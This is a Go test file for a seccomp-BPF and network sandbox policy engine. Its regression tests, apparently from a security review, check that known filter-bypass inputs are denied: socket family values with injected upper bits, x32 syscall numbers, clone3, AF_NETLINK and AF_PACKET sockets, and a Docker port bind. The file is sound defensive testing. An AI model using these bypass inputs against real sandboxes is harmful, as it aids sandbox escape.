		{name: "arm64_sched_getaffinity_123", num: 123, sysName: "sched_getaffinity", wantDec: DecisionAllow, wantErrno: 0},
		{name: "arm64_rseq_293", num: 293, sysName: "rseq", wantDec: DecisionAllow, wantErrno: 0},
		{name: "arm64_clone3_435", num: 435, sysName: "clone3", wantDec: DecisionDeny, wantErrno: ErrnoENOSYS},
	}

	for _, tc := range cases {
		// Check EvalBPF directly with native arm64 syscall number and AUDIT_ARCH_AARCH64.
		ret, err := EvalBPF(cp.BPF, SeccompData{NR: tc.num, Arch: AuditArchAArch64})
		if err != nil {
			t.Fatalf("EvalBPF(%s): %v", tc.name, err)
		}
		bDec, bErr := DecisionFromSeccompRet(ret)
		if bDec != tc.wantDec || bErr != tc.wantErrno {
			t.Errorf("%s EvalBPF = (%s, errno=%d), want (%s, errno=%d)", tc.name, bDec, bErr, tc.wantDec, tc.wantErrno)
		}

		// Check Engine.Evaluate by name AND by numeric ID.
		resByName := eng.Evaluate(EvaluationRequest{
			TenantID: "org-arm64", SandboxID: "sb-arm64", Domain: DomainSyscall,
			Syscall: &SyscallEvent{SyscallName: tc.sysName},
		})
		if resByName.Decision != tc.wantDec || resByName.Errno != tc.wantErrno {
			t.Errorf("%s Engine(name=%s) = (%s, errno=%d), want (%s, errno=%d)", tc.name, tc.sysName, resByName.Decision, resByName.Errno, tc.wantDec, tc.wantErrno)
		}

		n := int(tc.num)
		resByNum := eng.Evaluate(EvaluationRequest{
			TenantID: "org-arm64", SandboxID: "sb-arm64", Domain: DomainSyscall,
			Syscall: &SyscallEvent{SyscallNumber: &n},
		})
		if resByNum.Decision != tc.wantDec || resByNum.Errno != tc.wantErrno {
			t.Errorf("%s Engine(num=%d) = (%s, errno=%d), want (%s, errno=%d)", tc.name, tc.num, resByNum.Decision, resByNum.Errno, tc.wantDec, tc.wantErrno)
		}
	}

	// Retargeting an x86_64 policy with x86_64-only syscall ("open") to arm64 MUST fail closed.
	x86Spec := DefaultVisorSandboxPolicy(ModeEnforceSigkill)
	x86Spec.Arch = "arm64"
	if _, err := CompilePolicy(x86Spec); !errors.Is(err, ErrInvalidPolicy) {
		t.Fatalf("expected ErrInvalidPolicy when compiling x86_64-only syscalls for arm64, got %v", err)
	}

	// Mismatched (name, number) pair on arm64 (e.g., write=1 from x86_64) MUST fail closed.
	badPair := TracingPolicy{
		ID: "bad-arm64-pair", Mode: ModeEnforceSigkill, Arch: "arm64",
		SyscallRules: []SyscallRule{
			{ID: "r1", Priority: 100, Effect: EffectAllow, SyscallName: "write", SyscallNumber: intPtr(1)},
		},
	}
	if _, err := CompilePolicy(badPair); !errors.Is(err, ErrInvalidPolicy) {
		t.Fatalf("expected ErrInvalidPolicy for arm64 write=1 mismatch, got %v", err)
	}
}

// Regression test for Codex Finding #2: socket family checks must compare at the kernel's
// 32-bit int width so setting upper 32-bit register bits (e.g., (1<<32)|AF_NETLINK) cannot bypass.
func TestSocketFamily32BitWidthRejectsUpperBitBypass(t *testing.T) {
	eng := NewEngine(EngineConfig{})
	cp, err := eng.UpsertPolicy("org-sock", DefaultVisorSandboxPolicy(ModeEnforceSigkill))
	if err != nil {
		t.Fatalf("UpsertPolicy: %v", err)
	}
	if _, err := eng.BindSandbox("org-sock", "sb-sock", cp.Spec.ID); err != nil {
		t.Fatalf("BindSandbox: %v", err)
	}

	sockNum, _ := LookupSyscallNumber("socket")
	cases := []struct {
		name    string
		family  uint64
		wantDec Decision
	}{
		{name: "af_inet_allowed", family: 2, wantDec: DecisionAllow},
		{name: "af_inet6_allowed", family: 10, wantDec: DecisionAllow},
		{name: "af_netlink_denied", family: AFNetlink, wantDec: DecisionDeny},
		{name: "af_netlink_upper_bit_denied", family: (1 << 32) | AFNetlink, wantDec: DecisionDeny},
		{name: "af_netlink_high_garbage_denied", family: 0xdeadbeef00000000 | AFNetlink, wantDec: DecisionDeny},
		{name: "af_packet_denied", family: AFPacket, wantDec: DecisionDeny},
		{name: "af_packet_upper_bit_denied", family: (1 << 32) | AFPacket, wantDec: DecisionDeny},
	}

	for _, tc := range cases {
		res := eng.Evaluate(EvaluationRequest{
			TenantID: "org-sock", SandboxID: "sb-sock", Domain: DomainSyscall,
			Syscall: &SyscallEvent{SyscallName: "socket", Args: [6]uint64{tc.family, 1, 0}},
		})
		if res.Decision != tc.wantDec {
			t.Errorf("%s Engine = %s (rule=%s), want %s", tc.name, res.Decision, res.RuleID, tc.wantDec)
		}
		ret, err := EvalBPF(cp.BPF, SeccompData{
			NR:   sockNum,
			Arch: AuditArchX86_64,
			Args: [6]uint64{tc.family, 1, 0},
		})
		if err != nil {
			t.Fatalf("EvalBPF(%s): %v", tc.name, err)
		}
		bDec, _ := DecisionFromSeccompRet(ret)
		if bDec != tc.wantDec {
			t.Errorf("%s EvalBPF = %s (ret=0x%x), want %s", tc.name, bDec, ret, tc.wantDec)
		}
	}
}

// Regression test for Codex Finding #3: clone3 must not be unconditionally allowed; it returns
// ENOSYS so runtimes fall back to legacy clone(2) where sys-deny-clone-ns inspects flags.
func TestClone3ReturnsENOSYSForSafeFallback(t *testing.T) {
	clone3Num, ok := LookupSyscallNumber("clone3")
	if !ok {
		t.Fatal("clone3 missing from amd64 table")
	}
	for _, mode := range []EnforcementMode{ModeAuditOnly, ModeEnforceDeny, ModeEnforceSigkill} {
		eng := NewEngine(EngineConfig{})
		cp, err := eng.UpsertPolicy("org-c3", DefaultVisorSandboxPolicy(mode))
		if err != nil {
			t.Fatalf("UpsertPolicy(%s): %v", mode, err)
		}
		if _, err := eng.BindSandbox("org-c3", "sb-c3", cp.Spec.ID); err != nil {
			t.Fatalf("BindSandbox: %v", err)
		}

		res := eng.Evaluate(EvaluationRequest{
			TenantID: "org-c3", SandboxID: "sb-c3", Domain: DomainSyscall,
			Syscall: &SyscallEvent{SyscallName: "clone3"},
		})
		ret, err := EvalBPF(cp.BPF, SeccompData{NR: clone3Num, Arch: AuditArchX86_64})
		if err != nil {
			t.Fatalf("EvalBPF(%s): %v", mode, err)
		}
		bDec, bErr := DecisionFromSeccompRet(ret)

		if mode == ModeAuditOnly {
			if res.Decision != DecisionAuditAlert || bDec != DecisionAuditAlert {
				t.Errorf("mode=%s: Engine=%s BPF=%s, want AUDIT_ALERT", mode, res.Decision, bDec)
			}
		} else {
			if res.Decision != DecisionDeny || res.Errno != ErrnoENOSYS {
				t.Errorf("mode=%s: Engine=(%s, errno=%d), want (DENY, ENOSYS=38)", mode, res.Decision, res.Errno)
			}
			if bDec != DecisionDeny || bErr != ErrnoENOSYS {
				t.Errorf("mode=%s: BPF=(%s, errno=%d), want (DENY, ENOSYS=38)", mode, bDec, bErr)
			}
		}
	}
}

// Regression test for Codex Finding #4: amd64 seccomp-BPF prologue must explicitly reject
// x32 syscall numbers (nr >= __X32_SYSCALL_BIT = 0x40000000) even when DefaultSyscallAllow=true.
func TestX32SyscallBitRejectedInAmd64Prologue(t *testing.T) {
	spec := TracingPolicy{
		ID:                  "allow-default-deny-mount",
		Mode:                ModeEnforceSigkill,
		Arch:                "amd64",
		DefaultSyscallAllow: true,
		SyscallRules: []SyscallRule{
			{ID: "deny-mount", Priority: 1000, Effect: EffectDeny, Action: ModeEnforceSigkill, SyscallName: "mount"},
		},
	}
	cp, err := CompilePolicy(spec)
	if err != nil {
		t.Fatalf("CompilePolicy: %v", err)
	}

	// Native read(0) -> ALLOW.
	if ret, err := EvalBPF(cp.BPF, SeccompData{NR: 0, Arch: AuditArchX86_64}); err != nil || ret != SeccompRetAllow {
		t.Fatalf("native read(0): ret=0x%x err=%v, want ALLOW", ret, err)
	}
	// Native mount(165) -> KILL_PROCESS.
	if ret, err := EvalBPF(cp.BPF, SeccompData{NR: 165, Arch: AuditArchX86_64}); err != nil || ret != SeccompRetKillProcess {
		t.Fatalf("native mount(165): ret=0x%x err=%v, want KILL_PROCESS", ret, err)
	}
	// x32 mount (0x400000a5) -> MUST be rejected with KILL_PROCESS (never reach DefaultSyscallAllow).
	if ret, err := EvalBPF(cp.BPF, SeccompData{NR: X32SyscallBit | 165, Arch: AuditArchX86_64}); err != nil || ret != SeccompRetKillProcess {
		t.Fatalf("x32 mount(0x%x): ret=0x%x err=%v, want KILL_PROCESS", X32SyscallBit|165, ret, err)
	}
	// x32 read (0x40000000) -> MUST also be rejected with KILL_PROCESS.
	if ret, err := EvalBPF(cp.BPF, SeccompData{NR: X32SyscallBit, Arch: AuditArchX86_64}); err != nil || ret != SeccompRetKillProcess {
		t.Fatalf("x32 read(0x%x): ret=0x%x err=%v, want KILL_PROCESS", X32SyscallBit, ret, err)
	}
}

// Regression test for Codex Finding #5: legitimate runtime init syscalls (sched_getaffinity,
// rseq, faccessat2, capget) must be resolved and allowed in the default profile.
func TestRuntimeInitSyscallsAllowlisted(t *testing.T) {
	eng := NewEngine(EngineConfig{})
	cp, err := eng.UpsertPolicy("org-init", DefaultVisorSandboxPolicy(ModeEnforceSigkill))
	if err != nil {
		t.Fatalf("UpsertPolicy: %v", err)
	}
	if _, err := eng.BindSandbox("org-init", "sb-init", cp.Spec.ID); err != nil {
		t.Fatalf("BindSandbox: %v", err)
	}

	initSyscalls := []struct {
		name string
		num  uint32
	}{
		{"sched_getaffinity", 204},
		{"rseq", 334},
		{"faccessat2", 439},
		{"capget", 125},
		{"ppoll", 271},
		{"pselect6", 270},
	}
	for _, sc := range initSyscalls {
		res := eng.Evaluate(EvaluationRequest{
			TenantID: "org-init", SandboxID: "sb-init", Domain: DomainSyscall,
			Syscall: &SyscallEvent{SyscallName: sc.name},
		})
		if res.Decision != DecisionAllow {
			t.Errorf("runtime init syscall %s(%d) Engine = %s, want ALLOW", sc.name, sc.num, res.Decision)
		}
		ret, err := EvalBPF(cp.BPF, SeccompData{NR: sc.num, Arch: AuditArchX86_64})
		if err != nil || ret != SeccompRetAllow {
			t.Errorf("runtime init syscall %s(%d) EvalBPF = 0x%x (err=%v), want ALLOW", sc.name, sc.num, ret, err)
		}
	}
}

// Regression test for Codex Finding #6: bind-only port-0 loopback requests (127.0.0.1:0, [::1]:0)
// must be allowed for ephemeral httptest/net.Listen listeners without relaxing egress restrictions.
func TestLoopbackBindPortZeroAllowedWithoutRelaxingEgress(t *testing.T) {
	eng := NewEngine(EngineConfig{})
	cp, err := eng.UpsertPolicy("org-bind0", DefaultVisorSandboxPolicy(ModeEnforceSigkill))
	if err != nil {
		t.Fatalf("UpsertPolicy: %v", err)
	}
	if _, err := eng.BindSandbox("org-bind0", "sb-bind0", cp.Spec.ID); err != nil {
		t.Fatalf("BindSandbox: %v", err)
	}

	cases := []struct {
		name    string
		ev      NetworkEvent
		wantDec Decision
	}{
		{name: "bind_loopback_v4_port0", ev: NetworkEvent{Direction: NetDirBind, Protocol: "tcp", DestIP: "127.0.0.1", DestPort: 0}, wantDec: DecisionAllow},
		{name: "bind_loopback_v6_port0", ev: NetworkEvent{Direction: NetDirBind, Protocol: "tcp", DestIP: "::1", DestPort: 0}, wantDec: DecisionAllow},
		{name: "egress_loopback_v4_port0_denied", ev: NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "127.0.0.1", DestPort: 0}, wantDec: DecisionSigkill},
		{name: "egress_loopback_v6_port0_denied", ev: NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "::1", DestPort: 0}, wantDec: DecisionSigkill},
		{name: "bind_loopback_v4_docker_port_denied", ev: NetworkEvent{Direction: NetDirBind, Protocol: "tcp", DestIP: "127.0.0.1", DestPort: 2375}, wantDec: DecisionSigkill},
		{name: "bind_wildcard_v4_port0_denied", ev: NetworkEvent{Direction: NetDirBind, Protocol: "tcp", DestIP: "0.0.0.0", DestPort: 0}, wantDec: DecisionSigkill},
	}
	for _, tc := range cases {
		res := eng.Evaluate(EvaluationRequest{
			TenantID: "org-bind0", SandboxID: "sb-bind0", Domain: DomainNetwork,
			Network: &tc.ev,
		})
		if res.Decision != tc.wantDec {
			t.Errorf("%s: got %s (rule=%s), want %s", tc.name, res.Decision, res.RuleID, tc.wantDec)
		}
	}

	// Combining MatchPortZero with PortStart/PortEnd must fail validation.
	badNet := TracingPolicy{
		ID: "bad-port-zero", Mode: ModeEnforceDeny,
		NetworkRules: []NetworkRule{
			{ID: "n1", Priority: 100, Effect: EffectAllow, Direction: NetDirBind, Protocol: "tcp", CIDR: "127.0.0.0/8", PortStart: 80, MatchPortZero: true},
		},
	}
	if _, err := CompilePolicy(badNet); !errors.Is(err, ErrInvalidPolicy) {
		t.Fatalf("expected ErrInvalidPolicy for matchPortZero + portStart, got %v", err)
	}
}

// Regression test for Codex Finding #7: PolicySummary.Digest must cover every enforcement-relevant
// field across global defaults and all three domains (ports, direction, protocol, arg/lineage
// predicates, priorities, errnos, etc.).
func TestPolicyDigestCoversAllEnforcementFields(t *testing.T) {
	baseSpec := func() TracingPolicy {
		return TracingPolicy{
			ID:                  "digest-test",
			Name:                "Digest Test",
			Mode:                ModeEnforceDeny,
			DefaultSyscallAllow: false,
			DefaultProcessAllow: false,
			DefaultNetworkAllow: false,
			DenyPrivEsc:         true,
			AuditAllowEvents:    false,
			SyscallRules: []SyscallRule{
				{ID: "s1", Priority: 100, Effect: EffectDeny, Action: ModeEnforceDeny, Errno: ErrnoEPERM, SyscallName: "socket", ArgFilters: []SyscallArgFilter{{Index: 0, Op: ArgOpEqual32, Value: AFNetlink}}},
			},
			ProcessRules: []ProcessRule{
				{ID: "p1", Priority: 100, Effect: EffectAllow, BinaryPrefix: "/usr/bin", ArgContains: "status", ArgRegex: "^git", RequiredParent: "bash", ForbiddenAncestor: "sudo"},
			},
			NetworkRules: []NetworkRule{
				{ID: "n1", Priority: 100, Effect: EffectAllow, Direction: NetDirEgress, Protocol: "tcp", CIDR: "0.0.0.0/0", PortStart: 443, PortEnd: 443},
			},
		}
	}

	baseCP, err := CompilePolicy(baseSpec())
	if err != nil {
		t.Fatalf("CompilePolicy base: %v", err)
	}
	// Identical spec MUST yield identical digest.
	sameCP, err := CompilePolicy(baseSpec())
	if err != nil {
		t.Fatalf("CompilePolicy same: %v", err)
	}
	if baseCP.Digest != sameCP.Digest {
		t.Fatalf("non-deterministic digest: %s != %s", baseCP.Digest, sameCP.Digest)
	}

	mutations := []struct {
		name   string
		mutate func(*TracingPolicy)
	}{
		{"net_port_443_to_4444", func(p *TracingPolicy) { p.NetworkRules[0].PortStart = 4444; p.NetworkRules[0].PortEnd = 4444 }},
		{"net_direction_egress_to_bind", func(p *TracingPolicy) { p.NetworkRules[0].Direction = NetDirBind }},
		{"net_protocol_tcp_to_udp", func(p *TracingPolicy) { p.NetworkRules[0].Protocol = "udp" }},
		{"net_match_port_zero", func(p *TracingPolicy) {
			p.NetworkRules[0].PortStart = 0
			p.NetworkRules[0].PortEnd = 0
			p.NetworkRules[0].MatchPortZero = true
		}},
		{"net_priority", func(p *TracingPolicy) { p.NetworkRules[0].Priority = 200 }},
		{"proc_arg_contains", func(p *TracingPolicy) { p.ProcessRules[0].ArgContains = "diff" }},
		{"proc_arg_regex", func(p *TracingPolicy) { p.ProcessRules[0].ArgRegex = "^go" }},
		{"proc_required_parent", func(p *TracingPolicy) { p.ProcessRules[0].RequiredParent = "sh" }},
		{"proc_forbidden_ancestor", func(p *TracingPolicy) { p.ProcessRules[0].ForbiddenAncestor = "su" }},
		{"proc_priority", func(p *TracingPolicy) { p.ProcessRules[0].Priority = 250 }},
		{"default_process_allow", func(p *TracingPolicy) { p.DefaultProcessAllow = true }},
		{"default_network_allow", func(p *TracingPolicy) { p.DefaultNetworkAllow = true }},
		{"deny_priv_esc", func(p *TracingPolicy) { p.DenyPrivEsc = false }},
		{"audit_allow_events", func(p *TracingPolicy) { p.AuditAllowEvents = true }},
		{"syscall_errno", func(p *TracingPolicy) { p.SyscallRules[0].Errno = ErrnoENOSYS }},
		{"syscall_audit_on_allow", func(p *TracingPolicy) { p.SyscallRules[0].AuditOnAllow = true }},
		{"syscall_priority", func(p *TracingPolicy) { p.SyscallRules[0].Priority = 500 }},
	}

	seen := map[string]string{baseCP.Digest: "base"}
	for _, m := range mutations {
		spec := baseSpec()
		m.mutate(&spec)
		cp, err := CompilePolicy(spec)
		if err != nil {
			t.Fatalf("CompilePolicy(%s): %v", m.name, err)
		}
		if prev, dup := seen[cp.Digest]; dup {
			t.Errorf("digest collision between %q and %q (%s)", prev, m.name, cp.Digest)
		}
		seen[cp.Digest] = m.name
	}
}

func intPtr(v int) *int { return &v }
